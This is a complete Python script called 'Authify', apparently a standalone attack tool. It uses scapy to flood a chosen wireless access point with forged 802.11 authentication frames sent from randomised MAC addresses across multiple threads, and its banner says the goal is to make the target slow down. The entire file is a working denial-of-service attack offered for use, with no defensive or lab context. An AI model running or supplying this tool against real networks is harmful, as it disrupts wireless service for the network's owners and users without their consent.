from scapy.all import *
import random
import time
import threading
import argparse

s = """
    _         _   _                 _____ _ 
   / \  _   _| |_| |__  _   _      |  ___(_)
  / _ \| | | | __| '_ \| | | |_____| |_  | |
 / ___ \ |_| | |_| | | | |_| |_____|  _| | |
/_/   \_\__,_|\__|_| |_|\__, |     |_|   |_|
                        |___/               

wifi authentication attack framework
Spamming target with multiple auth packets, causing it to slow down.

"""

# returns random mac address as string
def get_random_mac():
    mac = [
        0x00,
        0x16,
        0x3E,
        random.randint(0x00, 0x7F),
        random.randint(0x00, 0xFF),
        random.randint(0x00, 0xFF),
    ]
    return ":".join(map(lambda x: "%02x" % x, mac))


def authify(mac, packet_count, verbosity, interface, destination):
    dot11 = Dot11(
        type=0,
        subtype=11,
        addr1=destination,
        addr2=mac,
        addr3=destination,
    )
    dot11auth = Dot11Auth(algo=0, seqnum=1, status=0)
    packet = RadioTap() / dot11 / dot11auth

    sendp(packet, iface=interface, count=packet_count, verbose=verbosity)


# keep the section closed... mostly argss and stuff
if __name__ == "__main__":
    print(s)

    argparser = argparse.ArgumentParser(
        description="Authify, authentication flooder for 802.11"
    )
    argparser.add_argument(
        "-dst",
        "--destination_address",
        help="Destination MAC address of the packet: '11:11:11:11:11:11",
        required=True,
    )
    argparser.add_argument(
        "-c", "--count", help="Number of packets to sent.", default=1, type=int
    )
    argparser.add_argument(
        "-t", "--threads", help="Number of threads with unique MAC", default=1, type=int
    )
    argparser.add_argument(
        "-v",
        "--verbose",
        help="verbosity",
        default=1,
        choices=["0", "1"],
    )
    argparser.add_argument("-i", "--interface", help="Interface", required=True)

    args = vars(argparser.parse_args())

    print(args, "\n")

    arr = []
    n = args["threads"]
    for i in range(0, n):
        int(args["verbose"]) and print("starting thread{}".format(i))
        arr.append(
            threading.Thread(
                target=authify,
                args=(
                    get_random_mac(),
                    args["count"],
                    int(args["verbose"]),
                    args["interface"],
                    args["destination_address"],
                ),
            )
        )
        arr[i].start()

    for i in range(0, n):
        arr[i].join()
